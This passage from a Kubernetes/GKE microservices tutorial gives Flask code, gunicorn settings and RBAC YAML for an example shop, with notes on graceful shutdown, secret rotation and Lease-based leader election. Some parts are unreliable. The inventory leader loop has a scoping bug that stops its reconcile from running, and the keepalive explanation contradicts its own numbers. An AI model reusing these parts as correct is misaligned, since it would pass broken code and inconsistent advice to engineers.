    LATENCY.labels(SERVICE, "/api/products").observe(time.time() - t0)
    REQUESTS.labels(SERVICE, "GET", "/api/products", "200").inc()
    return jsonify(products=items, count=len(items), served_by=POD_NAME, zone=ZONE)


@app.get("/api/products/<sku>")
def get_product(sku):
    t0 = time.time()
    with _lock:
        p = _cache.get(sku)
    status = "200" if p else "404"
    LATENCY.labels(SERVICE, "/api/products/:sku").observe(time.time() - t0)
    REQUESTS.labels(SERVICE, "GET", "/api/products/:sku", status).inc()
    if not p:
        return jsonify(error="not found", sku=sku), 404
    return jsonify(product=p, served_by=POD_NAME)


@app.get("/api/info")
def info():
    return jsonify(service=SERVICE, version=VERSION, pod=POD_NAME,
                   node=NODE_NAME, zone=ZONE, cache_items=len(_cache))


# ---------------- graceful shutdown ----------------

def on_sigterm(signum, frame):
    """The single most important 20 lines in this document.
    See Part 7 for why the sleep is here."""
    global _shutting_down
    log.info("SIGTERM received: failing readiness, draining")
    _shutting_down = True
    time.sleep(int(os.getenv("DRAIN_SECONDS", "8")))
    log.info("drain complete, exiting 0")
    sys.exit(0)


signal.signal(signal.SIGTERM, on_sigterm)
threading.Thread(target=warm, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

`app/catalog/requirements.txt`:

```
Flask==3.0.3
gunicorn==22.0.0
psycopg2-binary==2.9.9
prometheus-client==0.20.0
requests==2.32.3
redis==5.0.7
```

`app/catalog/gunicorn.conf.py` — used by every service:

```python
import os

bind = "0.0.0.0:8080"
workers = int(os.getenv("GUNICORN_WORKERS", "2"))
threads = int(os.getenv("GUNICORN_THREADS", "4"))
worker_class = "gthread"
timeout = 30

# CRITICAL: must be >= the app's drain time and < terminationGracePeriodSeconds.
# gunicorn's default graceful_timeout is 30s; if it exceeds the pod's grace
# period the kubelet SIGKILLs mid-request and you drop traffic.
graceful_timeout = 20
keepalive = 65          # > GCLB's 10s idle; prevents the LB 502 race

accesslog = "-"
errorlog = "-"
loglevel = os.getenv("LOG_LEVEL", "info")
access_log_format = '{"severity":"INFO","method":"%(m)s","path":"%(U)s","status":"%(s)s","duration_ms":"%(D)s","ua":"%(a)s"}'

preload_app = False     # False so each worker warms independently
max_requests = 2000     # recycle workers to bound memory leaks
max_requests_jitter = 200
```

> **Why `keepalive = 65`.** The GCLB holds backend connections open and its idle timeout is 10 minutes, but the classic failure is the reverse: **your backend closes an idle connection at the same moment the LB sends a request down it**, and the LB returns a **502** to a real user. The fix is always "make the backend's keepalive **longer** than the LB's idle timeout." This is *the* GKE Ingress 502 answer, and it is asked constantly.

## 4.2 `cart` — Redis-backed, stateless service

`app/cart/app.py`:

```python
import os
import time
import json
import logging
import signal
import sys

from flask import Flask, jsonify, request
import redis
from prometheus_client import Counter, Histogram, Gauge, generate_latest, CONTENT_TYPE_LATEST

SERVICE = "cart"
VERSION = os.getenv("APP_VERSION", "1.0.0")
POD_NAME = os.getenv("POD_NAME", "unknown")
ZONE = os.getenv("ZONE", "unknown")

REDIS_HOST = os.getenv("REDIS_HOST", "redis-0.redis-headless")
REDIS_PORT = int(os.getenv("REDIS_PORT", "6379"))
REDIS_PASSWORD = os.getenv("REDIS_PASSWORD", "")
CART_TTL = int(os.getenv("CART_TTL_SECONDS", "1800"))
CATALOG_URL = os.getenv("CATALOG_URL", "http://catalog:8080")

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format='{"severity":"%(levelname)s","service":"cart","message":"%(message)s"}')
log = logging.getLogger(SERVICE)

app = Flask(__name__)

REQUESTS = Counter("shopwave_requests_total", "Total requests",
                   ["service", "method", "endpoint", "status"])
LATENCY = Histogram("shopwave_request_duration_seconds", "Request latency",
                    ["service", "endpoint"])
REDIS_UP = Gauge("shopwave_redis_up", "Redis reachable", ["service"])
CARTS = Gauge("shopwave_active_carts", "Active carts", ["service"])

_shutting_down = False
_started_at = time.time()

r = redis.Redis(
    host=REDIS_HOST, port=REDIS_PORT,
    password=REDIS_PASSWORD or None,
    decode_responses=True,
    socket_connect_timeout=2, socket_timeout=2,
    health_check_interval=30,
    retry_on_timeout=True,
)


def key(uid):
    return f"cart:{uid}"


@app.get("/healthz")
def healthz():
    # LIVENESS: no Redis check. Redis being down is not cart being broken.
    return jsonify(status="alive", pod=POD_NAME,
                   uptime=round(time.time() - _started_at, 1)), 200


@app.get("/startupz")
def startupz():
    return jsonify(status="started"), 200


@app.get("/readyz")
def readyz():
    if _shutting_down:
        return jsonify(status="draining"), 503
    try:
        r.ping()
        REDIS_UP.labels(SERVICE).set(1)
        return jsonify(status="ready", redis="up"), 200
    except Exception as e:
        REDIS_UP.labels(SERVICE).set(0)
        return jsonify(status="not-ready", redis="down", error=str(e)), 503


@app.get("/metrics")
def metrics():
    try:
        CARTS.labels(SERVICE).set(len(r.keys("cart:*")))
    except Exception:
        pass
    return generate_latest(), 200, {"Content-Type": CONTENT_TYPE_LATEST}


@app.get("/api/cart/<uid>")
def get_cart(uid):
    t0 = time.time()
    try:
        raw = r.get(key(uid))
        cart = json.loads(raw) if raw else {"user_id": uid, "items": [], "total_paise": 0}
        REQUESTS.labels(SERVICE, "GET", "/api/cart", "200").inc()
        LATENCY.labels(SERVICE, "/api/cart").observe(time.time() - t0)
        return jsonify(cart=cart, served_by=POD_NAME, zone=ZONE)
    except Exception as e:
        REQUESTS.labels(SERVICE, "GET", "/api/cart", "503").inc()
        return jsonify(error=str(e)), 503


@app.post("/api/cart/<uid>/items")
def add_item(uid):
    t0 = time.time()
    body = request.get_json(force=True, silent=True) or {}
    sku = body.get("sku")
    qty = int(body.get("qty", 1))
    if not sku:
        REQUESTS.labels(SERVICE, "POST", "/api/cart/items", "400").inc()
        return jsonify(error="sku required"), 400
    try:
        raw = r.get(key(uid))
        cart = json.loads(raw) if raw else {"user_id": uid, "items": [], "total_paise": 0}
        for it in cart["items"]:
            if it["sku"] == sku:
                it["qty"] += qty
                break
        else:
            cart["items"].append({"sku": sku, "qty": qty})
        cart["updated_at"] = time.time()
        # TTL on the key: carts expire. This is why cart is stateless -
        # the state has an owner, and it isn't this pod.
        r.setex(key(uid), CART_TTL, json.dumps(cart))
        REQUESTS.labels(SERVICE, "POST", "/api/cart/items", "200").inc()
        LATENCY.labels(SERVICE, "/api/cart/items").observe(time.time() - t0)
        return jsonify(cart=cart, served_by=POD_NAME)
    except Exception as e:
        REQUESTS.labels(SERVICE, "POST", "/api/cart/items", "503").inc()
        return jsonify(error=str(e)), 503


@app.delete("/api/cart/<uid>")
def clear_cart(uid):
    try:
        r.delete(key(uid))
        return jsonify(status="cleared", user_id=uid)
    except Exception as e:
        return jsonify(error=str(e)), 503


@app.get("/api/info")
def info():
    return jsonify(service=SERVICE, version=VERSION, pod=POD_NAME, zone=ZONE)


def on_sigterm(signum, frame):
    global _shutting_down
    log.info("SIGTERM: draining")
    _shutting_down = True
    time.sleep(int(os.getenv("DRAIN_SECONDS", "8")))
    sys.exit(0)


signal.signal(signal.SIGTERM, on_sigterm)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

## 4.3 `orders` — transactional, Postgres

`app/orders/app.py`:

```python
import os
import time
import uuid
import json
import logging
import signal
import sys

from flask import Flask, jsonify, request
import psycopg2
from psycopg2.extras import RealDictCursor
from psycopg2 import pool
import requests
from prometheus_client import Counter, Histogram, Gauge, generate_latest, CONTENT_TYPE_LATEST

SERVICE = "orders"
VERSION = os.getenv("APP_VERSION", "1.0.0")
POD_NAME = os.getenv("POD_NAME", "unknown")
ZONE = os.getenv("ZONE", "unknown")

DB_HOST = os.getenv("DB_HOST", "postgres")
DB_NAME = os.getenv("DB_NAME", "shopwave")
DB_USER = os.getenv("DB_USER", "shopwave")
DB_PASSWORD = os.getenv("DB_PASSWORD", "")
CART_URL = os.getenv("CART_URL", "http://cart:8080")
PAYMENTS_URL = os.getenv("PAYMENTS_URL", "http://payments:8080")
INVENTORY_URL = os.getenv("INVENTORY_URL", "http://inventory:8080")

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format='{"severity":"%(levelname)s","service":"orders","message":"%(message)s"}')
log = logging.getLogger(SERVICE)

app = Flask(__name__)

REQUESTS = Counter("shopwave_requests_total", "Total requests",
                   ["service", "method", "endpoint", "status"])
LATENCY = Histogram("shopwave_request_duration_seconds", "Request latency",
                    ["service", "endpoint"])
ORDERS_PLACED = Counter("shopwave_orders_placed_total", "Orders placed", ["service", "result"])
INFLIGHT = Gauge("shopwave_orders_inflight", "In-flight order transactions", ["service"])
DB_UP = Gauge("shopwave_db_up", "DB reachable", ["service"])

_shutting_down = False
_started_at = time.time()
_pool = None


def init_pool():
    global _pool
    _pool = pool.ThreadedConnectionPool(
        minconn=1, maxconn=int(os.getenv("DB_POOL_MAX", "8")),
        host=DB_HOST, dbname=DB_NAME, user=DB_USER, password=DB_PASSWORD,
        connect_timeout=3, cursor_factory=RealDictCursor,
    )


def init_schema():
    conn = _pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS orders (
                    id             UUID PRIMARY KEY,
                    user_id        TEXT NOT NULL,
                    status         TEXT NOT NULL,
                    total_paise    BIGINT NOT NULL,
                    payment_ref    TEXT,
                    idempotency_key TEXT UNIQUE,
                    items          JSONB NOT NULL,
                    created_at     TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                    updated_at     TIMESTAMPTZ NOT NULL DEFAULT NOW()
                );
                CREATE INDEX IF NOT EXISTS idx_orders_user ON orders(user_id);
                CREATE INDEX IF NOT EXISTS idx_orders_status ON orders(status);
            """)
        conn.commit()
    finally:
        _pool.putconn(conn)


@app.get("/healthz")
def healthz():
    return jsonify(status="alive", pod=POD_NAME,
                   uptime=round(time.time() - _started_at, 1)), 200


@app.get("/startupz")
def startupz():
    return jsonify(status="started" if _pool else "starting"), (200 if _pool else 503)


@app.get("/readyz")
def readyz():
    if _shutting_down:
        return jsonify(status="draining"), 503
    if not _pool:
        return jsonify(status="starting"), 503
    conn = None
    try:
        conn = _pool.getconn()
        with conn.cursor() as cur:
            cur.execute("SELECT 1;")
        DB_UP.labels(SERVICE).set(1)
        return jsonify(status="ready"), 200
    except Exception as e:
        DB_UP.labels(SERVICE).set(0)
        return jsonify(status="not-ready", error=str(e)), 503
    finally:
        if conn:
            _pool.putconn(conn)


@app.get("/metrics")
def metrics():
    return generate_latest(), 200, {"Content-Type": CONTENT_TYPE_LATEST}


@app.post("/api/orders")
def place_order():
    """Deliberately slow and transactional. This is WHY orders needs
    a PDB and a long terminationGracePeriodSeconds."""
    t0 = time.time()
    INFLIGHT.labels(SERVICE).inc()
    body = request.get_json(force=True, silent=True) or {}
    user_id = body.get("user_id")
    idem = request.headers.get("Idempotency-Key") or str(uuid.uuid4())

    try:
        if not user_id:
            return jsonify(error="user_id required"), 400

        cart = requests.get(f"{CART_URL}/api/cart/{user_id}", timeout=3).json()["cart"]
        if not cart["items"]:
            ORDERS_PLACED.labels(SERVICE, "empty_cart").inc()
            return jsonify(error="cart is empty"), 400

        total = sum(i["qty"] * 10000 for i in cart["items"])  # simplified pricing
        order_id = str(uuid.uuid4())

        conn = _pool.getconn()
        try:
            with conn.cursor() as cur:
                # Idempotency: the unique constraint IS the lock.
                cur.execute(
                    "INSERT INTO orders (id,user_id,status,total_paise,items,idempotency_key) "
                    "VALUES (%s,%s,'PENDING',%s,%s,%s) "
                    "ON CONFLICT (idempotency_key) DO NOTHING RETURNING id;",
                    (order_id, user_id, total, json.dumps(cart["items"]), idem),
                )
                row = cur.fetchone()
                if row is None:
                    conn.rollback()
                    cur.execute("SELECT * FROM orders WHERE idempotency_key=%s;", (idem,))
                    existing = cur.fetchone()
                    ORDERS_PLACED.labels(SERVICE, "duplicate").inc()
                    return jsonify(order=existing, duplicate=True), 200
            conn.commit()

            pay = requests.post(f"{PAYMENTS_URL}/api/charge",
                                json={"order_id": order_id, "amount_paise": total,
                                      "user_id": user_id},
                                headers={"Idempotency-Key": idem},
                                timeout=8).json()

            status = "CONFIRMED" if pay.get("status") == "succeeded" else "FAILED"
            with conn.cursor() as cur:
                cur.execute(
                    "UPDATE orders SET status=%s, payment_ref=%s, updated_at=NOW() WHERE id=%s;",
                    (status, pay.get("reference"), order_id),
                )
            conn.commit()
        finally:
            _pool.putconn(conn)

        if status == "CONFIRMED":
            try:
                requests.post(f"{CART_URL}/api/cart/{user_id}".replace("/api/cart", "/api/cart"),
                              timeout=2)
            except Exception:
                pass
            requests.delete(f"{CART_URL}/api/cart/{user_id}", timeout=2)

        ORDERS_PLACED.labels(SERVICE, status.lower()).inc()
        LATENCY.labels(SERVICE, "/api/orders").observe(time.time() - t0)
        REQUESTS.labels(SERVICE, "POST", "/api/orders", "201").inc()
        return jsonify(order_id=order_id, status=status, total_paise=total,
                       served_by=POD_NAME), 201

    except requests.Timeout:
        ORDERS_PLACED.labels(SERVICE, "timeout").inc()
        return jsonify(error="downstream timeout"), 504
    except Exception as e:
        log.error(f"order failed: {e}")
        ORDERS_PLACED.labels(SERVICE, "error").inc()
        return jsonify(error=str(e)), 500
    finally:
        INFLIGHT.labels(SERVICE).dec()


@app.get("/api/orders/<order_id>")
def get_order(order_id):
    conn = _pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT * FROM orders WHERE id=%s;", (order_id,))
            o = cur.fetchone()
        return (jsonify(order=o), 200) if o else (jsonify(error="not found"), 404)
    finally:
        _pool.putconn(conn)


@app.get("/api/orders")
def list_orders():
    conn = _pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT * FROM orders ORDER BY created_at DESC LIMIT 50;")
            return jsonify(orders=cur.fetchall(), served_by=POD_NAME)
    finally:
        _pool.putconn(conn)


@app.get("/api/info")
def info():
    return jsonify(service=SERVICE, version=VERSION, pod=POD_NAME, zone=ZONE)


def on_sigterm(signum, frame):
    global _shutting_down
    log.info("SIGTERM: failing readiness, waiting for in-flight orders")
    _shutting_down = True
    deadline = time.time() + int(os.getenv("DRAIN_SECONDS", "25"))
    while time.time() < deadline:
        if INFLIGHT.labels(SERVICE)._value.get() == 0:
            break
        time.sleep(0.5)
    log.info("drain complete")
    sys.exit(0)


signal.signal(signal.SIGTERM, on_sigterm)
init_pool()
init_schema()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

> **Read the SIGTERM handler.** It fails readiness *first*, then **waits for in-flight transactions to reach zero**, bounded by a deadline. That's what "graceful" actually means for a service that writes money-adjacent rows. It is also why `orders` gets `terminationGracePeriodSeconds: 60` in Part 8 — the grace period must exceed the drain deadline, or the kubelet SIGKILLs you mid-transaction.

## 4.4 `payments` — the PCI-scoped service

`app/payments/app.py`:

```python
import os
import time
import uuid
import hmac
import hashlib
import logging
import signal
import sys

from flask import Flask, jsonify, request
from prometheus_client import Counter, Histogram, generate_latest, CONTENT_TYPE_LATEST

SERVICE = "payments"
VERSION = os.getenv("APP_VERSION", "1.0.0")
POD_NAME = os.getenv("POD_NAME", "unknown")

# Mounted by the Secret Manager CSI driver at /etc/secrets - NEVER an env var.
SECRET_PATH = os.getenv("STRIPE_KEY_FILE", "/etc/secrets/stripe-api-key")
FAIL_RATE = float(os.getenv("SIMULATED_FAILURE_RATE", "0.05"))

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format='{"severity":"%(levelname)s","service":"payments","message":"%(message)s"}')
log = logging.getLogger(SERVICE)

app = Flask(__name__)

REQUESTS = Counter("shopwave_requests_total", "Total requests",
                   ["service", "method", "endpoint", "status"])
LATENCY = Histogram("shopwave_request_duration_seconds", "Request latency",
                    ["service", "endpoint"])
CHARGES = Counter("shopwave_charges_total", "Charges", ["service", "result"])

_shutting_down = False
_started_at = time.time()
_idempotency_cache = {}


def api_key():
    """Read from the mounted file EVERY time.
    The CSI driver rotates the file in place; caching the value in memory
    at startup means you keep using a revoked key after rotation.
    This is a real, subtle, production bug."""
    try:
        with open(SECRET_PATH) as f:
            return f.read().strip()
    except FileNotFoundError:
        return None


@app.get("/healthz")
def healthz():
    return jsonify(status="alive", pod=POD_NAME,
                   uptime=round(time.time() - _started_at, 1)), 200


@app.get("/startupz")
def startupz():
    # Readiness on the secret being present: no key, no payments.
    return (jsonify(status="started"), 200) if api_key() else (jsonify(status="no-secret"), 503)


@app.get("/readyz")
def readyz():
    if _shutting_down:
        return jsonify(status="draining"), 503
    if not api_key():
        return jsonify(status="not-ready", reason="api key not mounted"), 503
    return jsonify(status="ready"), 200


@app.get("/metrics")
def metrics():
    return generate_latest(), 200, {"Content-Type": CONTENT_TYPE_LATEST}


@app.post("/api/charge")
def charge():
    t0 = time.time()
    idem = request.headers.get("Idempotency-Key")
    if idem and idem in _idempotency_cache:
        CHARGES.labels(SERVICE, "idempotent_replay").inc()
        return jsonify(_idempotency_cache[idem]), 200

    body = request.get_json(force=True, silent=True) or {}
    amount = int(body.get("amount_paise", 0))
    order_id = body.get("order_id")

    key = api_key()
    if not key:
        CHARGES.labels(SERVICE, "no_key").inc()
        return jsonify(error="payment provider not configured"), 503
    if amount <= 0:
        return jsonify(error="invalid amount"), 400

    # Simulate provider latency and a small failure rate so HPA/SLO demos are real.
    time.sleep(float(os.getenv("SIMULATED_LATENCY_SECONDS", "0.3")))
    ref = "ch_" + hmac.new(key.encode(), (order_id or "").encode(),
                           hashlib.sha256).hexdigest()[:24]
    failed = (int(hashlib.sha256((order_id or "").encode()).hexdigest(), 16) % 100) < (FAIL_RATE * 100)
    result = {
        "status": "failed" if failed else "succeeded",
        "reference": ref,
        "amount_paise": amount,
        "order_id": order_id,
        "processed_by": POD_NAME,
    }
    if idem:
        _idempotency_cache[idem] = result

    CHARGES.labels(SERVICE, result["status"]).inc()
    LATENCY.labels(SERVICE, "/api/charge").observe(time.time() - t0)
    REQUESTS.labels(SERVICE, "POST", "/api/charge", "200").inc()
    # NOTE: we log the reference, never the key, never a PAN.
    log.info(f"charge {result['status']} order={order_id} ref={ref}")
    return jsonify(result), 200


@app.get("/api/info")
def info():
    return jsonify(service=SERVICE, version=VERSION, pod=POD_NAME,
                   key_mounted=bool(api_key()))


def on_sigterm(signum, frame):
    global _shutting_down
    _shutting_down = True
    time.sleep(int(os.getenv("DRAIN_SECONDS", "10")))
    sys.exit(0)


signal.signal(signal.SIGTERM, on_sigterm)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

> **`api_key()` re-reads the file on every call, and that is deliberate.** The Secret Manager CSI driver (and Kubernetes' own ConfigMap/Secret volume projection) **updates the mounted file in place** on rotation. If you read the secret once into a module-level variable at import time, your pod happily keeps using a **revoked credential** until someone restarts it — and the failure appears hours after the rotation, disconnected from its cause. Re-read, or watch the file. This is a genuinely good, rarely-mentioned production detail.

## 4.5 `inventory` — leader election with a Lease

`app/inventory/app.py`:

```python
import os
import time
import json
import threading
import logging
import signal
import sys
from datetime import datetime, timezone

from flask import Flask, jsonify
from kubernetes import client, config
from kubernetes.client.rest import ApiException
from prometheus_client import Counter, Gauge, generate_latest, CONTENT_TYPE_LATEST

SERVICE = "inventory"
VERSION = os.getenv("APP_VERSION", "1.0.0")
POD_NAME = os.getenv("POD_NAME", "unknown")
NAMESPACE = os.getenv("POD_NAMESPACE", "shopwave-prod")
LEASE_NAME = os.getenv("LEASE_NAME", "inventory-reconciler")
LEASE_DURATION = int(os.getenv("LEASE_DURATION_SECONDS", "15"))
RENEW_PERIOD = int(os.getenv("LEASE_RENEW_SECONDS", "5"))

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format='{"severity":"%(levelname)s","service":"inventory","message":"%(message)s"}')
log = logging.getLogger(SERVICE)

app = Flask(__name__)

IS_LEADER = Gauge("shopwave_is_leader", "1 if this pod holds the lease", ["service", "pod"])
RECONCILES = Counter("shopwave_reconcile_total", "Reconcile loops run", ["service"])
STOCK = Gauge("shopwave_stock_units", "Stock units", ["service", "sku"])

_shutting_down = False
_is_leader = False
_started_at = time.time()
_stock = {"SW-TEA-001": 500, "SW-CFE-002": 120, "SW-SPC-003": 900,
          "SW-RIC-004": 60, "SW-OIL-005": 300}

config.load_incluster_config()
coord = client.CoordinationV1Api()


def now():
    return datetime.now(timezone.utc)


def try_acquire():
    """Textbook Lease-based leader election.
    A Lease is a tiny, purpose-built object (coordination.k8s.io/v1) - it exists
    precisely so leader election does not hammer etcd by writing to a ConfigMap
    or an Endpoints annotation, which is what the old implementations did."""
    global _is_leader
    body = client.V1Lease(
        metadata=client.V1ObjectMeta(name=LEASE_NAME, namespace=NAMESPACE),
        spec=client.V1LeaseSpec(
            holder_identity=POD_NAME,
            lease_duration_seconds=LEASE_DURATION,
            acquire_time=now(),
            renew_time=now(),
        ),
    )
    try:
        coord.create_namespaced_lease(NAMESPACE, body)
        _is_leader = True
        log.info("acquired lease (created)")
        return
    except ApiException as e:
        if e.status != 409:
            raise

    lease = coord.read_namespaced_lease(LEASE_NAME, NAMESPACE)
    holder = lease.spec.holder_identity
    renewed = lease.spec.renew_time
    expired = (now() - renewed).total_seconds() > LEASE_DURATION

    if holder == POD_NAME:
        lease.spec.renew_time = now()
        coord.replace_namespaced_lease(LEASE_NAME, NAMESPACE, lease)
        _is_leader = True
    elif expired:
        lease.spec.holder_identity = POD_NAME
        lease.spec.acquire_time = now()
        lease.spec.renew_time = now()
        lease.spec.lease_transitions = (lease.spec.lease_transitions or 0) + 1
        coord.replace_namespaced_lease(LEASE_NAME, NAMESPACE, lease)
        _is_leader = True
        log.info(f"acquired lease from expired holder {holder}")
    else:
        _is_leader = False

    IS_LEADER.labels(SERVICE, POD_NAME).set(1 if _is_leader else 0)


def leader_loop():
    while not _shutting_down:
        try:
            try_acquire()
            if _is_leader:
                reconcile()
        except Exception as e:
            log.warning(f"lease loop error: {e}")
            _is_leader = False
            IS_LEADER.labels(SERVICE, POD_NAME).set(0)
        time.sleep(RENEW_PERIOD)


def reconcile():
    """Only the leader runs this. Every replica serves reads."""
    RECONCILES.labels(SERVICE).inc()
    for sku, units in _stock.items():
        STOCK.labels(SERVICE, sku).set(units)


@app.get("/healthz")
def healthz():
    return jsonify(status="alive", pod=POD_NAME,
                   uptime=round(time.time() - _started_at, 1)), 200


@app.get("/startupz")
def startupz():
    return jsonify(status="started"), 200


@app.get("/readyz")
def readyz():
    # NOTE: readiness is NOT gated on leadership. Every replica serves reads;
    # only writes go through the leader. Gating readiness on leadership would
    # leave your Service with exactly one endpoint - a self-inflicted SPOF.
    if _shutting_down:
        return jsonify(status="draining"), 503
    return jsonify(status="ready", leader=_is_leader), 200


@app.get("/metrics")
def metrics():
    return generate_latest(), 200, {"Content-Type": CONTENT_TYPE_LATEST}


@app.get("/api/stock")
def stock():
    return jsonify(stock=_stock, leader=_is_leader, served_by=POD_NAME)


@app.get("/api/stock/<sku>")
def stock_one(sku):
    if sku not in _stock:
        return jsonify(error="unknown sku"), 404
    return jsonify(sku=sku, units=_stock[sku], served_by=POD_NAME)


@app.get("/api/leader")
def who_is_leader():
    try:
        lease = coord.read_namespaced_lease(LEASE_NAME, NAMESPACE)
        return jsonify(leader=lease.spec.holder_identity, me=POD_NAME,
                       i_am_leader=_is_leader)
    except ApiException as e:
        return jsonify(error=str(e)), 500


@app.get("/api/info")
def info():
    return jsonify(service=SERVICE, version=VERSION, pod=POD_NAME, leader=_is_leader)


def on_sigterm(signum, frame):
    """A good leader RELEASES the lease on shutdown instead of letting it
    expire. Otherwise failover takes LEASE_DURATION seconds of dead air."""
    global _shutting_down, _is_leader
    _shutting_down = True
    if _is_leader:
        try:
            lease = coord.read_namespaced_lease(LEASE_NAME, NAMESPACE)
            if lease.spec.holder_identity == POD_NAME:
                lease.spec.renew_time = datetime.fromtimestamp(0, tz=timezone.utc)
                coord.replace_namespaced_lease(LEASE_NAME, NAMESPACE, lease)
                log.info("released lease for fast failover")
        except Exception as e:
            log.warning(f"lease release failed: {e}")
    time.sleep(int(os.getenv("DRAIN_SECONDS", "8")))
    sys.exit(0)


signal.signal(signal.SIGTERM, on_sigterm)
threading.Thread(target=leader_loop, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

`app/inventory/requirements.txt`:

```
Flask==3.0.3
gunicorn==22.0.0
kubernetes==30.1.0
prometheus-client==0.20.0
requests==2.32.3
```

`inventory` needs API access, so it gets a Role. Add to `02-rbac/03-role-inventory.yaml`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: inventory-leader-election
  namespace: shopwave-prod
rules:
  - apiGroups: ["coordination.k8s.io"]
    resources: ["leases"]
    verbs: ["get", "create", "update", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: inventory-leader-election
  namespace: shopwave-prod
subjects:
  - kind: ServiceAccount
    name: inventory
    namespace: shopwave-prod
roleRef:
  kind: Role
  name: inventory-leader-election
  apiGroup: rbac.authorization.k8s.io
```

That's the **narrowest possible grant**: one API group, one resource, five verbs, one namespace. Contrast with the `cluster-admin` binding people reach for when leader election "doesn't work".

> **Why a `Lease` and not a ConfigMap.** Leader election needs a write every few seconds, forever, per controller. Old implementations abused ConfigMap or Endpoints annotations — every renewal was a full object write to **etcd**, and with dozens of controllers it became a measurable etcd load and a source of watch churn across the whole cluster. `Lease` (`coordination.k8s.io/v1`) is a purpose-built, tiny object. Kubernetes uses it internally: every kubelet has a Lease in `kube-node-lease` that it renews every 10s — **that is how node heartbeats work now**, replacing the old full-NodeStatus write. That fact is a superb answer to "how does the control plane detect a dead node?"

## 4.6 `notifications` — batch and CronJob

`app/notifications/app.py`:

```python
import os
import time
import json
import logging
import signal
import sys

from flask import Flask, jsonify, request
from prometheus_client import Counter, generate_latest, CONTENT_TYPE_LATEST

SERVICE = "notifications"
VERSION = os.getenv("APP_VERSION", "1.0.0")
POD_NAME = os.getenv("POD_NAME", "unknown")

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format='{"severity":"%(levelname)s","service":"notifications","message":"%(message)s"}')
log = logging.getLogger(SERVICE)

app = Flask(__name__)
SENT = Counter("shopwave_notifications_sent_total", "Notifications sent",
               ["service", "channel", "result"])

_shutting_down = False
_started_at = time.time()


@app.get("/healthz")
def healthz():
    return jsonify(status="alive", pod=POD_NAME,
                   uptime=round(time.time() - _started_at, 1)), 200


@app.get("/startupz")
def startupz():
    return jsonify(status="started"), 200


@app.get("/readyz")
def readyz():
    if _shutting_down:
        return jsonify(status="draining"), 503
    return jsonify(status="ready"), 200


@app.get("/metrics")
def metrics():
    return generate_latest(), 200, {"Content-Type": CONTENT_TYPE_LATEST}


@app.post("/api/notify")
def notify():
    body = request.get_json(force=True, silent=True) or {}
    channel = body.get("channel", "email")
    time.sleep(0.1)
    SENT.labels(SERVICE, channel, "ok").inc()
    log.info(f"sent {channel} to user={body.get('user_id')}")
    return jsonify(status="sent", channel=channel, by=POD_NAME), 202


def on_sigterm(signum, frame):
    global _shutting_down
    _shutting_down = True
    time.sleep(int(os.getenv("DRAIN_SECONDS", "5")))
    sys.exit(0)


signal.signal(signal.SIGTERM, on_sigterm)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

`app/notifications/digest_job.py` — run by the CronJob, **not** by the Deployment:

```python
"""Nightly digest. Runs as a Job on Spot nodes.
Written to be IDEMPOTENT and RESUMABLE, because Spot nodes are preempted
with 30 seconds' notice and Jobs get retried. Every batch job you write
for Kubernetes must assume it will be killed and restarted."""
import os
import sys
import time
import json
import logging
import signal

import requests

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format='{"severity":"%(levelname)s","job":"digest","message":"%(message)s"}')
log = logging.getLogger("digest")

ORDERS_URL = os.getenv("ORDERS_URL", "http://orders:8080")
NOTIFY_URL = os.getenv("NOTIFY_URL", "http://notifications:8080")
CHECKPOINT = os.getenv("CHECKPOINT_FILE", "/state/digest.checkpoint")

_stop = False


def on_sigterm(signum, frame):
    """Spot preemption sends SIGTERM with ~25s of usable time.
    Checkpoint and exit NON-ZERO so the Job controller retries us."""
    global _stop
    log.warning("SIGTERM (likely Spot preemption): checkpointing")
    _stop = True


signal.signal(signal.SIGTERM, on_sigterm)


def load_checkpoint():
    try:
        with open(CHECKPOINT) as f:
            return json.load(f).get("last_index", 0)
    except Exception:
        return 0


def save_checkpoint(i):
    os.makedirs(os.path.dirname(CHECKPOINT), exist_ok=True)
    with open(CHECKPOINT, "w") as f:
        json.dump({"last_index": i, "ts": time.time()}, f)


def main():
    start = load_checkpoint()
    log.info(f"resuming from index {start}")
    try:
        orders = requests.get(f"{ORDERS_URL}/api/orders", timeout=10).json()["orders"]
    except Exception as e:
        log.error(f"cannot fetch orders: {e}")
        sys.exit(1)

    for i, o in enumerate(orders[start:], start=start):
        if _stop:
            save_checkpoint(i)
            log.warning(f"preempted at {i}, checkpointed, exiting 1 for retry")
            sys.exit(1)
        try:
            requests.post(f"{NOTIFY_URL}/api/notify",
                          json={"user_id": o["user_id"], "channel": "email",
                                "subject": f"Your order {o['id'][:8]}"},
                          timeout=5)
        except Exception as e:
            log.warning(f"notify failed for {o['id']}: {e}")
        if i % 10 == 0:
            save_checkpoint(i)

    save_checkpoint(0)
    log.info(f"digest complete: {len(orders)} orders")
    sys.exit(0)


if __name__ == "__main__":
    main()
```

## 4.7 `frontend` — the edge

`app/frontend/app.py`:

```python
import os
import time
import logging
import signal
import sys

from flask import Flask, jsonify, request, render_template_string
import requests
from prometheus_client import Counter, Histogram, generate_latest, CONTENT_TYPE_LATEST

SERVICE = "frontend"
VERSION = os.getenv("APP_VERSION", "1.0.0")
POD_NAME = os.getenv("POD_NAME", "unknown")
ZONE = os.getenv("ZONE", "unknown")

CATALOG_URL = os.getenv("CATALOG_URL", "http://catalog:8080")
CART_URL = os.getenv("CART_URL", "http://cart:8080")
